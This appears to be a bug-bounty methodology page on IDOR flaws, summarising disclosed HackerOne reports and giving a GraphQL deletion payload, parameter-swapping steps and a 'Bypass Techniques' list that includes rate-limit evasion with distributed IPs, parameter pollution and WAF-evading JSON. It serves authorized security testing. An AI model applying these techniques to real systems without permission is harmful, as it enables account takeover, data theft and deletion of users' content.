## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Delete anyone's content spotlight remotely.** — `#1819832` · Snapchat · $15,000 · ▲801

  > {"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT STORY"},"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!) {\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}

- **IDOR allows user to access report details via reference.json endpoint** — `#3862641` · HackerOne · $15,000 · ▲372

  > By sending a POST request to the `/reports/{report id}/reference.json` endpoint with an empty JSON body `{}`, VDP users could retrieve information about private reports belonging to other programs despite receiving an access-denied error.

- **Insecure Direct Object Reference (IDOR) - Delete Campaigns** — `#1969141` · HackerOne · $0 · ▲346

  > At the campaign id parameter in the request change it to another program's ongoing campaign id parameter.

- **Attachment disclosure via summary report** — `#2442008` · HackerOne · $0 · ▲340

  > or in gdrive, if yt can't be seen yet : https://███████

- **Arbitrary Read of Another Users private repository without Authorization** — `#3124517` · GitHub · $10,000 · ▲276

  > [CVE-2025-8447](https://www.cve.org/cverecord?id=CVE-2025-8447)

- **Deleting all DMs on RedditGifts.com** — `#1213237` · Reddit · $5,000 · ▲267

  > Change cookies/csrf token and `4423007` to your own message ID

- **Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint** — `#2487889` · HackerOne · $0 · ▲266

  > idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity rating`,`readable substate`,`created at`,`submitted at`,`reporter name`

- **Singapore - Account Takeover via IDOR** — `#876300` · Starbucks · $0 · ▲260

  > ko2sec discovered that an alternate site shared database and cookie credentials with card.starbucks.com.sg.

- **Steal private objects of other projects via project import** — `#743953` · GitLab · $20,000 · ▲254

  > Many attributes (foreign key) like `issue ids` and `merge request ids` are not excluded during import.

- **IDOR: Account Deletion via Session Misbinding – Attacker Can Delete Victim Account** — `#3154983` · Mozilla · $0 · ▲244

  > A critical vulnerability in the Firefox Accounts API allows an authenticated attacker to permanently delete any user's account by sending a `POST /v1/account/destroy` request using attacker session, but including the victim’s `email` and `authPW` (password…

- **Insecure redirect rule results in bypassing ban redirect on certain pages** — `#703058` · Roblox · $0 · ▲233

  > This allows us to access any pages ending in `.aspx/.ashx` without a ban-redirect, just by appending `/membership/` after the extension.

- **An IDOR that can lead to enumeration of a user and disclosure of email and phone number within cashier** — `#1966006` · Unikrn · $0 · ▲232

  > It was during the https://cashier.unikrn.com/cashier/transaction-history session handshake where we found out you could actually get access to another customer's data.

- **IDOR delete any Tickets on ads.tiktok.com** — `#1475520` · TikTok · $0 · ▲216

  > An IDOR (Insecure Direct Object Reference) vulnerability was found on TikTok ads, through the "draft order id" parameter which could have allowed an attacker to delete the support tickets of other users.

- **I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)** — `#391092` · Yelp · $0 · ▲214

  > @hk755a found an Insecure Direct Object Reference (IDOR) Vulnerability that allowed an attacker to pay with someone else's registered credit card, while ordering food with Grubhub through the `/checkout/transaction platform` endpoint.

- **IDOR vulnerability in unreleased HackerOne Copilot feature** — `#2218334` · HackerOne · $0 · ▲210

  > After creating a new conversation, look for `"operationName":"NewConversation",` graphql request in your `Proxy History` and store somewhere the value of `data.newConversation.llm conversation.id` from the response.

- **IDOR allows an attacker to modify the links of any user** — `#1661113` · Reddit · $0 · ▲208

  > - In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:

- **IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal** — `#915114` · Automattic · $0 · ▲202

  > If you click `Edit` button on any user of your team at https://app.crowdsignal.com/users/list-users.php, you will send a GET request to `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1`

- **IDOR on GraphQL queries BillingDocumentDownload and BillDetails** — `#2207248` · Shopify · $5,000 · ▲187

  > An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████:

- **IDOR Vulnerability at AddTagToAssets operation name** — `#2633771` · HackerOne · $0 · ▲178

  > You will obtain a request whose the operationName: `AddTagToAssets` and contains `tagId` parameter which has a base64 cipher text within

- **IDOR leads to Edit Anyone's Blogs / Websites** — `#974222` · Automattic · $0 · ▲177

  > Go to `https://www.intensedebate.com/edit-user-profile`, again and click `Save Settings` button open burp suite and change `hidBlogID` parameter with victim's `hidBlogID`.

- **Unauthorized Access to TikTok Account [Private Videos] via API Endpoint** — `#2868084` · TikTok · $0 · ▲167

  > A vulnerability on a TikTok endpoint was found that could have resulted in unauthorized viewing of videos from private accounts.

- **Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability** — `#1658418` · Reddit · $5,000 · ▲163

  > + If it's true then there are more logs and we can get them by just adding new variable after and assigning value of endCursor , which we can see in the reponse body of our request {F1851533}

- **Unreleased CTF Levels are Revealed on /group/user/ID1?user=USERID endpoint** — `#536853` · HackerOne · $0 · ▲161

  > However, an IDOR at the https://ctf.hacker101.com/group/user/ID1?user=USERID endpoint reveals them (see attached screenshot)

- **Email change or personal data change on the account.** — `#1250037` · Stripe · $3,000 · ▲149

  > @dk82hg found the email change flow on indiehackers.com was vulnerable to an insecure direct object reference (IDOR) which allowed an attacker to change the email associated with a user account to one they owned and ultimately take over a victim’s account in…

- **Disclose Hidden Comments on Media Section of hub.vroid.com** — `#2541962` · pixiv · $500 · ▲149

  > From UserAttacker, intercept any POST request made to https://hub.vroid.com/ and send it to the repeater

- **Importing GitLab project archives can replace uploads of other users** — `#534794` · GitLab · $0 · ▲148

  > Note that the request was for the `/root/new project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` file, however the file from the `test/modified project` was served.

- **IDOR vulnerability (Price manipulation)** — `#1403176` · Acronis · $0 · ▲146

  > 2.buy any product in this case i am going to buy this https://www.acronis.cz/produkt/acronis-cyber-protect-home-office/ for test

- **Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil** — `#2950536` · U.S. Dept Of Defense · $0 · ▲142

  > These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.

- **Missing ownership check on remote wipe endpoint** — `#819807` · Nextcloud · $500 · ▲141

  > Forward with burpsuite and in the url that looks like settings/personal/authtokens/wipe/{data-id}, change the data-id to the id of the device of the victim

- **IDOR and statistics leakage in Orders** — `#544329` · X / xAI · $289 · ▲141

  > Twitter on its service "MoPub" statistics dedicated to the results of "Order", after the test shows that the endpoint "https://app.mopub.com/web-client/api/orders/stats/query" is infected with a "IDOR " bug



## Case studies



### Delete anyone's content spotlight remotely.

`#1819832` · Snapchat · $15,000 · high · 2023-03-06 · ▲801

> Hello Snapchat, Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat users and profit in millions. I found a way to delete anyone's spotlight remotely. Please see the below poc:- 1. First go to https://my.snapchat.com/myposts and log in there. 2. You will see your posts . 3. Now turn burp suite and intercept. 4.Select any of your posts and click delete option. 5. Now capture the delete request.



### IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users

`#415081` · PayPal · $10,500 · high · 2019-07-30 · ▲797

> PayPal Business Accounts allow account owners to create multiple secondary users with specific privileges assigned to their employees. This submission identified a method that made it possible for a Business Account owner to assign secondary users from other accounts. The new secondary user would be granted access to the login allowing for unauthorized access to the functions of that single user login.



### How the Bug stole hacking

`#762510` · HackerOne · $0 · none · 2019-12-20 · ▲471

> In light of the season - here's a story I wrote for you: Impact Happy Holidays and thanks for all you do. <3



### IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query

`#2122671` · HackerOne · $0 · high · 2023-08-29 · ▲395

> Summary: Hey team, While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications . it simply can be done by editing the ID number in our graphql query. If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these. Steps To Reproduce 1. Log in to your own account in two browsers A and B with User A and User B 2.



### IDOR allows user to access report details via reference.json endpoint

`#3862641` · HackerOne · $15,000 · critical · 2026-10-01 · ▲372

> Summary: An information disclosure vulnerability on the /reports/{id}/reference.json endpoint allowed VDP accounts created via hackerone.com/vdp-sign-up to access certain private report details. While the endpoint returned HTTP 422 "You do not have the appropriate access," the error response contained additional report details in the context.subject field.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class idor --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class idor

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class idor

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class idor --min-bounty 1000

```



## Bypass Techniques



**Defense: UUIDs instead of sequential integers**

- Bypass: UUIDs often leak in other API responses, notification emails, webhooks, GraphQL queries, or JS source

- Technique: Harvest UUIDs from accessible endpoints, then replay against restricted ones



**Defense: Indirect/hashed object references**

- Bypass: Decode the hash (often base64 or simple obfuscation), or find the original ID in another response

- Technique: `echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`



**Defense: Short-lived tokens per resource**

- Bypass: Tokens sometimes reusable across users if server only validates token format, not binding

- Technique: Use your own token to access another user's resource ID



**Defense: Rate limiting on enumeration**

- Bypass: Slow enumeration (1 req/5s), use distributed IPs, or exploit non-enumeration IDORs (you already know the target's ID from another leak)



**Defense: Checking `user_id` in WHERE clause**

- Bypass: Check if the same endpoint exists at a different API version (`/v1/` vs `/v2/`) — authorization logic is often version-specific

- Technique: Check JS bundles for older API version calls



**Defense: CORS restrictions**

- Bypass: IDOR doesn't require cross-origin exploitation — you're testing API endpoints directly with your own session



**Defense: "Opaque" references via server-side sessions**

- Bypass: Look for any endpoint that *returns* the internal ID, then use it elsewhere; APIs often expose IDs in `Location` headers, error messages, or metadata



**Defense: Parameter filtering/WAF on common patterns**

- Bypass: Try nested JSON `{"data": {"id": "VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, or parameter name variations `user_id`, `userId`, `uid`, `account`



---
